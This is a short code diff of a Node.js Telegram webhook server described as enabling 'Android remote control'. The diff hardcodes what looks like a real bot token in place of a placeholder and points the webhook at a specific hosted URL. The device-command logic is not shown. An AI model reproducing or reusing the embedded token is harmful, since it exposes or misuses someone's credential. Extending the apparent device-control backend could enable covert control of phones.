@@ -1,29 +1,10 @@
-{
-  "name": "telegram-webhook-server",
-  "version": "1.0.0",
-  "description": "Telegram bot webhook server for Android remote control",
-  "main": "server.js",
-  "scripts": {
-    "start": "node server.js"
-  },
-  "dependencies": {
-    "express": "^4.18.2",
-    "axios": "^1.6.2"
-  },
-  "engines": {
-    "node": ">=18.0.0"
-  }
-}
-
-
 const express = require('express');
 const axios = require('axios');
-const crypto = require('crypto');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
 // Your bot token from @BotFather
-const BOT_TOKEN = process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
+const BOT_TOKEN = process.env.BOT_TOKEN || '8566422839:AAGqOdw_Bru2TwF8_BDw6vDGRhwwr-RE2uo';
 const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
 // Store authorized devices and their commands
@@ -297,7 +278,7 @@ async function sendTelegramDocument(chatId, documentBuffer, filename, caption) {
 app.listen(PORT, () => {
     console.log('🚀 ==================================');
     console.log(`🚀 Webhook server running on port ${PORT}`);
-    console.log(`🚀 Webhook URL: https://your-app.onrender.com/webhook`);
+    console.log(`🚀 Webhook URL: https://edu-hwpy.onrender.com/webhook`);
     console.log(`🚀 Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
     console.log('🚀 ==================================');
 });
